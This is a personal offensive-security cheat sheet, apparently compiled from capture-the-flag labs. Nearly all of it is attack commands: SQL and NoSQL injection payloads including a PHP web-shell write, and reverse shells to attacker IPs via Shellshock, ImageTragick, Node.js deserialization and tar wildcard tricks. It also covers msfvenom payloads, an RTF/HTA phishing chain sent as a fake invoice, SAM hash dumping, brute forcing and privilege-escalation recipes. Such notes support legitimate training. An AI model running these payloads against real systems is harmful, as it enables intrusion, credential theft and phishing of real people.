# Enumerations


## NC

nc -nvlkp 80 // for loop 


## Redis

username alias masteruser 
password alias requirepass

cmds :

EVAL "dofile('//10.10.234.85/noraj')" 0

INFO

CONFIG GET *

```bash
┌──(arundhanush㉿kali)-[~/CTF/THM/vulnet-internal]
└─$ redis-cli -h 10.10.189.126
10.10.189.126:6379> AUTH B65Hx562F@ggAZ@F       // username is defalut so give it blank password
OK
10.10.189.126:6379> KEYS *                      // cmd to find keys
1) "marketlist"
2) "authlist"
3) "internal flag"
4) "int"
5) "mykey"
6) "tmp"
10.10.189.126:6379> GET "internal flag"         // get or/ view a keys 
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.189.126:6379> lrange authlist 1 100       // to list 

1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.189.126:6379> 


```
## smbmap

sudo smbmap -R Folder -H <IP> -A <FileName> -q // search and download the particular file.

To list everything:

smb: \> recurse on
smb: \> prompt off
smb: \> ls

To download large files in smb

impacket-smbclient audit2020:'0xarun$'@10.10.10.192  

## smbpasswd

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack]
└─$ smbpasswd -r 10.10.177.120 -U sbradley       
Old SMB password:
New SMB password:                                                                                                                                                      
Retype new SMB password:                                                                                                                                               
Password changed for user sbradley  
```

## Dovecot imapd 

```
1. telnet brainfuck.htb 143
2. a1 LOGIN orestis kHGuERB29DNiNE
3. a2 LIST "" "*"
4. a3 EXAMINE INBOX
5. a4 FETCH 1 BODY[]
6. a5 FETCH 2 BODY[]
```

## Rsync

rsync -av --list-only rsync://10.10.44.104/
    
    files           Necessary home interaction

rsync rsync://rsync-connect@10.10.44.104/files/

rsync rsync://rsync-connect@10.10.44.104/files/sys-internal/user.txt . 
                                                                                                                                                                      
rsync home/arundhanush/.ssh/authorized_keys rsync://rsync-connect@10.10.44.104/files/sys-internal/.ssh/

## Port Knocking

knock -v 10.10.99.60 42 1337 10420 6969 63000

## git

git log

git checkout // to view commit

## Mount

mount -t nfs4 localhost:/  /mnt/try

## tcpdump

sudo tcpdump -i tun0 icmp

# Text Process

## Sed

sed 's/^/tiny /' wordlist.txt > new_wordlist.txt

## Memcached Server port 11211

Server which runs in linux.

memcached-tool 127.0.0.1:11211 dump 

to get creds.

## DNS 53 enumeration

dig axfr @10.10.10.13 cronos.htb

dig ANY @10.13.37.10 -x 10.13.37.10

## Snmp

snmpwalk -c public -v1 $ip

./onesixtyone -c /opt/Seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.11.136 

snmp-check 10.10.11.136 -c public or openview

## Flask-unsign cookies

flask_session_cookie_manager3.py // tool to encode decode the cookies

flask-unsign --unsign --server 'http://mercury.picoctf.net:6259/' --wordlist pico-wordlist-mc.txt // to find secret key of websitw with wordlist 

flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiMHhhcnVuIn0.YqWZkQ.g-FuN6GenolXzfF2TDvAvGJaTL0"  --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval 

flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret secret123

## Sqsh

sqsh -S 10.13.37.12:1433 -U teignton\\karl.memaybe -P 'B6rQx_d&RVqvcv2A'

select * from openquery("web\clients", 'select name from master..sysdatabases');

## pfx file decode

pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt



## Python Requests and Burp Suite

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://www.google.com/", proxies=proxies, verify=False)

## Complied python binary file extractor

https://github.com/extremecoders-re/pyinstxtractor

To decomplie python compiled file

	https://github.com/zrax/pycdc

## gcc cc1 problem

find /usr/ -name "*cc1*"
 out:  /usr/share/terminfo/x/xterm+pcc1
 out:  /usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc1
 out: /usr/libexec/gcc/x86_64-redhat-linux/4.8.2/cc1plus
export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/

# Injections

## NoSQL

{"username": {"$ne": null}, "password": {"$ne": null}}

## SQL

PAYLOAD : admin'||''==='

' OR 1 LIMIT 1, 2-- -

## Sql file writeable check payload 

" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -

**SQL file write**

" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '/var/www/html/shell.php' -- -



# Encryption & Decryption 

## vigenere-cipher 

https://fww.guballa.de/vigenere-solver

example: MYKAHODTQ{RVG_YVGGK_FAL_WXF} 

# Password Bruteforce

## Hydra

hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.251.51 http-get /inferno/ -t 64

hydra -l username -P /root/Desktop/Test.txt url.zz.za http-post-form "/portal/xlogin/:ed=^USER^&pw=^PASS^:S=302"

hydra -V -l ghost -P test.txt 10.10.78.81 -s 8080 http-post-form -m “/login.html?-1.-loginForm:urlfragment=&username=^USER^&password=^PASS^&Login= Login:’Login failed'”

hydra -l none -P rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V

hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.123.199 ssh

hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'


# Port Forwarding

Chisel

	On kali machine start server : chisel server -p 8000 --reverse
	
	On the Box : ./chisel client 10.9.172.114:8000 R:8001:127.0.0.1:6666 (Forwarding internal port 6666 to attaker box as port 8001)

SSH

ssh sys-internal@10.10.255.20 -i id_rsa -L 8111:localhost:8111

# File transfers

Windows :

	certutil -urlcache -f http://<ip>/uri output.ext 
	
	bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe

scp file.txt user@10.10.10.x:/tmp

scp -i id_rsa hermonine@10.10.222.199:/srv/time-turner/swagger .

curl http://192.168.1.2/putty.exe -o putty.exe

tftp -i 192.168.1.2 GET file.txt // need to start msf and host a files then use this get the file and put(upolad)

php -S 0.0.0.0:8080   //use to serve http to host files 
127.0.0.1:8080/file.txt   //dwonfile from browser

Send a file using netcat
nc -nv $ip 4444 < /usr/share/windows-binaries/wget.exe

Receive a file using netcat
nc -nlvp 4444 > incoming.exe

# Common Exploits

## CGI-BIN exploit

curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.49.233/9001 0>&1'" http://192.168.233.87/cgi-bin/test


## Exploit a firefox profile

compress .firefox then send to attacker machine after do this 

firefox --profile .firefox/b5w4643p.default-release --allow-downgrade 

check any saved cerds 

## ImageTragick

if the webserver converts png to jpg like this or file upload 

https://mukarramkhalid.com/imagemagick-imagetragick-exploit/

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik

exploit

```png
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.9.172.114/80 0<&1 2>&1'
pop graphic-context
pop graphic-cont
```
upload in website and got reverse shell

## Exploiting Node.js // Revese shell

```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```
reverse shell
```
_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.9.172.114:8000/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()

{"exec":"require('child_process').execSync('echo <base64> | base64 -d | bash').toString();"}

```
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

# Random

## Clock skew too great

```

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                                                                        
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ sudo ntpdate -u 10.10.10.100              
2023-02-09 20:17:57.155820 (+0530) +3645.074642 +/- 0.179480 10.10.10.100 s1 no-leap
CLOCK: time stepped by 3645.074642

```

## loops to check the ports

while true ; do ssh -i id_rsa hades@hell -p `shuf -i 2500-4500 -n 1` ; done

for i in {2500..4500}; do ssh -i id_rsa hades@hell -p $i ; done 

## SHA1 hash collision

https://sha-mbles.github.io/

Diffrent file has same hash is kown as hash collision

# Bruteforce

## wfuzz // Fuzzing numbers on post parameter. 

wfuzz -c -z range,00-99 -d "username=admin&password=adminFUZZadmin&submit=Submit" -X POST -u http://10.10.X.X/index.php -t 1 -s 20 

# TTY-Shell

This will give you a slightly better shell, but without those magical features. To get a fully functioning TTY shell:

Press Ctrl-z to background the current shell, then on your terminal type:
stty raw -echo; fg <enter><enter>

Then on your shell:

stty rows 36 cols 136
export TERM=xterm-256color 

## rbash bash restricted problems 

ssh session shows error when run cammand

    h4rdy@fortress:~$ ls
    rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names

ssh -i id_rsa h4rdy@fortress -t "bash --noprofile -i"

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

## Gpp Decrypt

GPO Password Decrypt

```bash
┌──(arun㉿kali)-[~/AD/AD-HTB-Tracks/Active]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

## GPG in Linux to Encrypt Files Decrypt

Using PGP encryption encrypt the file _credential.pgp_  to decrypt

Import the key:

	gpg --import tryhackme.asc

Decrypt the file:

	gpg --decrypt credentials.pgp

but its ask passwd 

lets do crack tryhackme.asc using gpg2johns

https://www.dummies.com/article/technology/computers/operating-systems/linux/how-to-use-gpg-in-linux-to-encrypt-files-255873

## Making Hash format for hashcat crack

```bash
┌──(arun㉿kali)-[~]
└─$ echo 'sha256:10000:'$(echo 'sO3XIbeW14' | base64 | cut -c1-14)':'$(echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64)

sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```        


## xor

cat encrypted.txt| python2 xor.py securewebincrocks

https://github.com/ShawnDEvans/xorpy/blob/master/xor.py


xortool encrypted.txt -b
    securewebincrocks


## Haskell

haskell is fiction programming language's bash cmd exec

```
import System.Process

main = callCommand "cp somefile somedestination"
```

https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell

## Find paticular file

find / -name "libfoo.so" 2>/dev/null
    /usr/lib/libfoo.so    

## Python escaping jails with buitin functions

https://anee.me/escaping-python-jails-849c65cf306e

```python
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()

kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
Hi! Welcome to my world kaneki
========================================================================
What ? You gonna stand like a chicken ? fight me Kaneki
>>> __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('/bin/bash')
root@vagrant:~# id

```

# Genereate Custom wordlists

Example:
crunch 4 4 0123456789 -o wordlist.txt to generate 4 number wordlist

```
cewl http://hamlet.thm/hamlet.txt --lowercase | awk 'length($0)>=12 && length($0)<=14' | uniq > wordlist.txt
```

## Built wordlist using base64 rule.

We will use the wordlist built by applying hashcat’s best64 rules to the passwd list.

hashcat --force passwd.txt -r /usr/share/hashcat/rules/best64.rule --stdout > best64-passwd.txt

Example:

Hash : b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885

Hashid tells its sha-512. The following https://www.dcode.fr/sha512-hash decoder cracked successfully. but there is a hint "password uses best64". So bulit the wordlist using base64 rule with help of hashcat.

hashcat --force passwd.txt -r /usr/share/hashcat/rules/best64.rule --stdout > best64-passwd.txt

## Shadow decrypt

```bash
cat passwd            
root:x:0:0:root:/root:/bin/bash
                                                                                                                                                                      
cat shadow 
root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4
                                                                                                                                                                      
unshadow passwd shadow > unshadow

```                      

## Kubectl

References:

https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/

https://rioasmara.com/2021/09/18/kubernetes-yaml-for-reverse-shell-and-map-root/

https://github.com/BishopFox/badPods/tree/main/manifests/everything-allowed

```bash
 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 auth can-i --list \\ to check list

 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 get pods , nodes, namespaces -o yaml \\ to get yaml output of pods, namespaces, and nodes

 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.210.227:6443 apply -f everything-allowed-exec-pod.yaml \\ malicious pod upload
                                                                                                                                                    
 kubectl --token=` cat token` --certificate-authority=/home/arundhanush/CTF/THM/palsforlife/ca.crt --server=https://10.10.34.60:6443 exec -it nginx-7f459c6889-8slv2 /bin/bash \\ execute pod as bash

```


## Pentesting Docker 2375 

curl -s http://open.docker.socket:2375/version | jq // get version

docker -H open.docker.socket:2375 version // get version

export DOCKER_HOST="tcp://localhost:2375" // To avoid -H option '-H' is host option.

docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash

docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

# Windows

## Shraphound

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All -Domain htb.local -zipFileName loot.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls                                                                                                                     
                                                                                                                                                                        
                                                                                                                                                                        
    Directory: C:\Users\svc-alfresco\Documents                                                                                                                          
                                                                                                                                                                        
                                                                                                                                                                        
Mode                LastWriteTime         Length Name                                                                                                                   
----                -------------         ------ ----                                                                                                                   
-a----         2/8/2023   9:39 AM          19096 20230208093954_loot.zip                                                                                                
-a----         2/8/2023   9:30 AM              0 bloodhound_data.json                                                                                                   
-a----         2/8/2023   9:02 AM        1250056 mimikatz.exe                                                                                                           
-a----         2/8/2023   9:39 AM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         2/8/2023   9:07 AM         770279 PowerView.ps1
-a----         2/8/2023   9:21 AM        1318097 SharpHound.ps1


```
Invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvic


## Ldapsearch

	ldapsearch -h localhost -p 389 -w J~42%W?PFHl]g -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -b "dc=pikaboo,dc=htb" -s sub "(objectclass=*)"

https://jonlabelle.com/snippets/view/markdown/ldap-search-filter-cheatsheet

	ldapsearch -LLL -x -H ldap://adlab.local -b '' -s base '(objectclass=*)'
	
	ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"
	
	ldapsearch -x -b <search_base> -H <ldap_host> -D <bind_dn> -W "objectclass=account"

## windapsearch

    windapsearch -m users -d htb.local --dc-ip 10.10.10.161 


## Kerbrute

kerbrute userenum -d outdated.htb --dc DC.outdated.htb users.txt

## Windows permissions check 

```
C:\PrivEsc>accesschk.exe /accepteula -vsqwc user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

AccessChk is a application to check access of files, keys, objects, processes or services.

-v = verbose
-s = recurse
-q = quit banner
-w = writeable access objects
-c = service name
-u = supper
-d = dictories

C:\PrivEsc>accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```
## xfreerdp

xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm /dynamic-resolution

## evil-winrm 

evil-winrm -i 10.10.11.152 -k key.pem -c pfx.crt -u -p -S // priv and pub key login

## Windows cmds

PS C:\Logs\WEBDB> type * | Select-String TEIGNTON \\ grep words

## rpcclient

RPC - TCP 445

rpcclient -U "" -N 10.10.10.161 // Null auth

I can get a list of users with "enumdomusers", "enumdomgroups" for groups;

querydispinfo

rpcclient 10.10.142.109 -U nik

### reset ad user passwd through rpclient

    rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xarun$"'

### To create starup shortcut vbs script in windows
```
:\PrivEsc>type CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save

C:\PrivEsc>cscript C:\PrivEsc\CreateShortcut.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.
```

### powershell xml open

```bash
*Evil-WinRM* PS C:\Users\lvetrova> cat lvetrova.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path ".\lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877adef0d85a92e6d17551fe4}

```

# Privsec linux

## Path hijacking

export PATH=/tmp:$PATH

## sudo (ALL, !root) /bin/bash

Exploits

sudo -u#-1 /bin/bash

## dstat privesc

nano /usr/local/share/dstat/dstat_lemon.py // reverse shell

doas -u root /usr/bin/dstat --lemon // run this

and there you go shell on your box

## Rsactftool 

public.crt to exract private.crt

python RsaCtfTool.py --publickey ../public.crt --private

## openssl 

openssl rsautl -decrypt -ssl -inkey private.crt -in key.bin.enc -out output
openssl aes-256-cbc -d -in secret.enc -pass file:output 


## npm privesc

mkdir exploit

echo '{"scripts": {"preinstall": "/bin/sh"}}' > exploit/package.json

sudo /usr/bin/npm -C /dev/shm/exploit/ --unsafe-perm i


## yml privesc

ruby file need to load this dependencies.yml so we modifed the file to do mallicious action that /bin/bash permission change.

```dependencies.yml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod 4777 /bin/bash"
         method_id: :resolve
```

https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565


## ruby cap_chown+ep

```bash
george@empline:~$ ruby -e "require 'fileutils'" -e "FileUtils.chown('george','george','/etc/passwd')"
george@empline:~$ ls -la /etc/passwd
-rw-r--r-- 1 george george 1660 Jul 20  2021 /etc/passwd

```

    openssl passwd -1 -salt root2 root   

$1$root2$qP6XJjGSJ/b7ZfJp.GGl80

add this hash in /etc/passwd and su root2 got root

## Path abuse

(ALL : ALL) /bin/nice /notes/*

exploit: 

sudo /bin/nice /notes/../home/webadmin/root.sh

## ps Tmux

Tmux sessions are open include root

tmux ls

tmux attch -t 0

crtl b then n

or

crtl b then o 



## pingsys 

/usr/bin/pingsys '127.0.0.1; /bin/sh'


## doas.conf 

DOas is alternative of sudo

**permit nopass plot_admin as root cmd openssl**

Exploit

doas openssl enc -in /root/root.txt

or

```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

simply create malicious c file complie it and run.

doas openssl req -engine ./lib.so



## privesc /etc/passwd

if user may writeable permission on /etc/passwd

create hash using openssl

    openssl passwd -1 -salt root2 root   

$1$root2$qP6XJjGSJ/b7ZfJp.GGl80

add this hash in /etc/passwd and su root2 got root

```bash
root:x:0:0:root:/root:/bin/bash
root2:$1$root2$qP6XJjGSJ/b7ZfJp.GGl80:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

```


## Wild card tar injection privesc

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

if crontab runs tar * 

Exploit:

Create shell.sh put nc reverse shell and make another files callled --checkpoint=1 which shows progress msg every number record and --checlpoint-action=exec=sh shell.sh and is execute when checkpoint is reached to 1 as we given early. once executed shell.sh we got root nc shell hence crontab root runs tar.

```bash
echo "mkfifo /tmp/lhennp; nc 10.9.172.114 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

## Capabilities Tar

```bash
getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow
```

## Flask run privesc

1. Create malicious app.py
2. set env variable to /tmp/app.py
3. run

```py
cat app.py 
import os

os.system("/bin/bash")
```

export FLASK_APP=/tmp/app.py

sudo -u root /usr/bin/flask run

## Docker privesc

https://www.hackingarticles.in/docker-privilege-escalation/

docker images 

docker run --rm -it --privileged alpine bash

docker run -v /:/mnt --rm -it alpine chroot /mnt sh


# lxd privesc

https://www.exploit-db.com/exploits/46978

* Download build-alpine in your local machine through the git repository.
* Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
* Transfer the tar file to the host machine

* Download the alpine image
* Import image for lxd
* Initialize the image inside a new container.
* Mount the container inside the /root directory


git clone https://github.com/saghul/lxd-alpine-builder.git

build the alpine as root 

sudo ./build-alpine

its gives us tar file move the file to host machine and exploit

$ lxc image import ./alpine-v3.15-x86_64-20220120_2255.tar.gz --alias myimage
$ lxc init myimage arun -c security.privileged=true
$ lxc config device add arun mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start arun
$ lxc exec arun /bin/sh

## privesc using Capabilities 

getcap -r / 2>/dev/null
pwd
ls -al python3
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id

# Active Directory

To reset the password:

    Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

To must change the password at login
    
     Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose


# Win-PrivEsc

What is this? AlwaysInstallElevated?

	The AlwaysInstallElevated policy feature is used to install an MSI package file with elevated (
system) privileges. This policy is enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs any program on the system. This method can make a machine vulnerable posing a high-security risk because a non-administrator user can run installations with elevated privileges and access many secure locations on the computer.

steps;;

create a meterpreter reverse pyload.exe and start reverse listerner
then send paload.exe to your victim box

then .\payload.exe trigger and ckeck lister got meterpreter shell 

now run meterpreter as background then use AlwaysInstallElevated metasploit exploit then set session 1 and set lhost tun0 exploit

reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

Run this both cmds for set value 1.

then run

msiexec /quiet /qn /i C:\Temp\setup.msi 

## SAM


```

C:\Windows\Repair>copy "C:\Windows\Repair\SAM" \\10.9.3.94\arun\
        1 file(s) copied.

C:\Windows\Repair>copy "C:\Windows\Repair\SYSTEM" \\10.9.3.94\arun\
        1 file(s) copied.
```

Extract the hashes.

```
┌──(arun㉿kali)-[/usr/share/creddump7]
└─$ python pwdump.py ~/CTF/THM/win10priv/SYSTEM ~/CTF/THM/win10priv/SAM 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```
## AD Writeowner ACL 

ex: User Tom has writeowner rights over claire

```bash

PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1                                                                  
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom                          
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword                                     
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "qwerty@1" -AsPlainText -force                      
PS C:\Users\tom\Desktop\AD Audit\BloodHound>                                                                                    
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred                     
PS C:\Users\tom\Desktop\AD Audit\BloodHound>    
```

## WriteDacl
	
    net group backup_admins
    net group backup_admins claire /add

```bash
claire@REEL C:\Users\claire>net group backup_admins                                                                                                                     
Group name     Backup_Admins                                                                                                                                            
Comment                                                                                                                                                                 
                                                                                                                                                                        
Members                                                                                                                                                                 

-------------------------------------------------------------------------------                                                 
ranj                                                                                                                            
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>net group backup_admins claire /add                                                                 
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>net group backup_admins                                                                             
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>exit 
```

## DNSadmin abuse

Create dll with msfvenom

msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f dll > exp.dl

then do

dnscmd.exe 127.0.0.1 /config /serverlevelplugindll \\10.10.14.12\share\exp.dll

start the listener

sc stop dns
sc start dns


## Phishing with RTF Dynamite RTF Exploit

Create a .hta file for getting reverse shell.

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=443 -f hta-psh -o rev.hta

Then create .rtf file 

https://github.com/bhdresh/CVE-2017-0199

python2 cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.12/rev.hta -t rtf -x 0

start the python server for file transfer 

    sudo python -m http.server 80

then start the nc listener

    nc -lvp 443

Now send the mail using sendmail

sendemail -f 0xarun@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "Payment Overdue" -a invoice.rtf -s 10.10.10.77 -v

Check the nc!


## Ldap passback attack vulnrable server setup (rouge ldap server)

sudo systemctl enable slapd

sudo systemctl start slapd

sudo dpkg-reconfigure -p low slapd // configure it with the domain which you attack

